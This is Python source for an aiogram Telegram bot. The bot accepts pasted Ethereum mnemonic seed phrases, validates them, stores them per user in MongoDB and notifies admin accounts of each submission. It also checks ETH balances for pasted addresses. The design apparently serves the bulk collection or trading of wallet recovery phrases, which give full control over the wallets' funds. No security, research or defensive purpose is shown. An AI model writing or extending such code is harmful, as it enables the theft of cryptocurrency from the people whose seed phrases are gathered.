from aiogram import Bot, Dispatcher, types, exceptions, executor
from aiogram.dispatcher.middlewares import BaseMiddleware
from aiogram.dispatcher.handler import CancelHandler
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.mongo import MongoStorage
from aiogram.dispatcher.handler import CancelHandler

from eth_account.hdaccount.mnemonic import Mnemonic
from web3._utils.validation import validate_address
from eth_utils import to_checksum_address

from db import User, init_db
from keyboards import Keyboards
from eth_api import ETHAPI
from basic_data import TEXTS
from config import config

from typing import Dict, List, Optional, Tuple, Union


bot: Bot = Bot(
    token = config.bot_token,
    parse_mode = types.ParseMode.HTML
)

dp: Dispatcher = Dispatcher(
    bot = bot,
    storage = MongoStorage(
        uri = config.db.uri
    )
)

keyboards: Keyboards = Keyboards()

eth_api: ETHAPI = ETHAPI(
    api_key = config.eth_api_key
)

eth_mnemonic: Mnemonic = Mnemonic(
    raw_language = "english"
)


class UsersForm(StatesGroup):
    add: State = State()
    check: State = State()


class UsersMiddleware(BaseMiddleware):
    def __init__(self) -> None:
        super(UsersMiddleware, self).__init__()

    async def on_process_message(self, message: types.Message, data: dict) -> None:
        if message.chat.type != types.ChatType.PRIVATE:
            raise CancelHandler

        user_id: int = message.chat.id

        user: User = await User.find_one(
            User.user_id == user_id
        )

        if not user:
            user = User(
                user_id = user_id
            )

            await user.insert()

        if not user.accepted:
            await message.answer(
                text = TEXTS["start"]["new"],
                reply_markup = keyboards.start_new
            )

            raise CancelHandler

        data["user"] = user


@dp.callback_query_handler(state="*")
async def callback_query_handler(callback_query: types.CallbackQuery) -> None:
    await callback_query.answer()

    user_id: int = callback_query.from_user.id

    user: User = await User.find_one(
        User.user_id == user_id
    )

    args: List[str] = callback_query.data.split("_")

    message: types.Message = callback_query.message

    if args[0] in ["accept", "menu"]: # также можно использовать args[0] == ... or args[0] == ...
        if args[0] == "accept":
            user.accepted = True

            await user.save()

        await message.edit_text(
            text = TEXTS["start"]["default"],
            reply_markup = keyboards.start
        )

    elif args[0] == "lines":
        if args[1] == "list":
            await message.edit_text(
                text = TEXTS["lines"]["list"]["default"].format(
                    lines = "\n".join([
                        TEXTS["lines"]["list"]["format"].format(
                            line = line
                        )
                        for line in user.lines
                    ])
                ),
                reply_markup = keyboards.menu
            )

        elif args[1] == "add":
            await UsersForm.add.set()

            await message.edit_text(
                text = TEXTS["lines"]["add"]["default"],
                reply_markup = keyboards.menu
            )

        elif args[1] == "check":
            await UsersForm.check.set()

            await message.edit_text(
                text = TEXTS["lines"]["check"]["default"],
                reply_markup = keyboards.menu
            )


@dp.message_handler(commands=["start"], state="*")
async def bot_start_command_handler(message: types.Message, user: User) -> None:
    await message.answer(
        text = TEXTS["start"]["default"],
        reply_markup = keyboards.start
    )


@dp.message_handler(state=UsersForm.add)
async def bot_users_add_process_handler(message: types.Message, user: User, state: FSMContext) -> None:
    await state.finish()

    lines: List[str] = message.text.split("\n")

    added_count: int = 0
    not_added_count: int = 0
    total_count: int = len(lines)

    for line in lines:
        if eth_mnemonic.is_mnemonic_valid(
            mnemonic = line
        ):
            user.lines.append(line)
            added_count += 1

        else:
            not_added_count += 1

    if added_count > 0:
        await user.save()

    await message.answer(
        text = TEXTS["lines"]["add"]["added"]["default"].format(
            added_count = added_count,
            not_added_count = not_added_count,
            total_count = total_count
        ),
        reply_markup = keyboards.menu
    )

    admins_text: str = TEXTS["lines"]["add"]["added"]["admins"].format(
        user_id = user.user_id,
        added_count = added_count
    )

    for admin_chat_id in config.admins:
        try:
            await bot.send_message(
                chat_id = admin_chat_id,
                text = admins_text
            )

        except exceptions.TelegramAPIError:
            pass


@dp.message_handler(state=UsersForm.check)
async def bot_users_check_process_handler(message: types.Message, user: User, state: FSMContext) -> None:
    await state.finish()

    temp_message: types.Message = await message.answer(
        text = TEXTS["wait"]
    )

    lines: List[str] = []

    for line in message.text.split("\n"):
        # try:
        validate_address(
            value = to_checksum_address(
                value = line.lower()
            )
        )

        lines.append(
            TEXTS["lines"]["check"]["format"].format(
                line = line,
                balance = format(
                    await eth_api.get_balance(
                        address = line
                    ) / 1000000000000000000,
                    ".8f"
                )
            )
        )

        # except:
        #     print("incor", line)
        #     pass

    await temp_message.delete()

    await message.answer(
        text = TEXTS["lines"]["check"]["finished"].format(
            lines = "\n".join(lines)
        ),
        reply_markup = keyboards.menu
    )


dp.middleware.setup(
    middleware = UsersMiddleware()
)


async def on_startup(dp: Dispatcher) -> None:
    await init_db(
        db_uri = config.db.uri,
        db_name = config.db.name
    )


async def on_shutdown(dp: Dispatcher) -> None:
    pass


if __name__ == "__main__":
    executor.start_polling(
        dispatcher = dp,
        skip_updates = False,
        on_startup = on_startup,
        on_shutdown = on_shutdown,
        allowed_updates = [
            "message",
            "callback_query",
            "chat_member"
        ]
    )
